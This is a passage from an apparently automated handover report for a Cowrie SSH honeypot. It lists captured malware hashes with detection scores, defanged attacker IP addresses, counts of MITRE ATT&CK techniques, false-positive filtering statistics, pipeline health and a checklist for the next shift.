| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **31/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `154.12.28[.]97` | HK | cognetcloud INC | **100** ⚠️ | 2 |
| `192.169.152[.]102` | US | GoDaddy.com, LLC | **100** ⚠️ | 3 |
| `176.65.139[.]161` | NL | Storm Industries | **100** ⚠️ | 25 |
| `122.199.113[.]36` | KR | kt HCN Co.,Ltd. | **100** ⚠️ | 5 |
| `118.26.110[.]171` | SG | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 41 |
| `66.132.172[.]190` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `104.41.137[.]249` | US | Microsoft Corporation | **100** ⚠️ | 30 |
| `101.36.108[.]213` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 42 |
| `197.243.14[.]52` | RW | Broadband Systems Corporation | **100** ⚠️ | 50 |
| `124.16.75[.]116` | CN | Computer Network Information Center of Chinese Academy of Sciences (CNIC-CAS) | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 60 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 32 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 28 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |

---

## 🔕 False Positive Summary (86 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 80 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 213 cases |
| Tool 34  | Credential Extractor        | ✅ 63 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 86 filtered (40.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 32 priority case(s) shown individually · 20 recon entry/entries in table (8 group(s) consolidating 83 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-22T10:55:26Z_
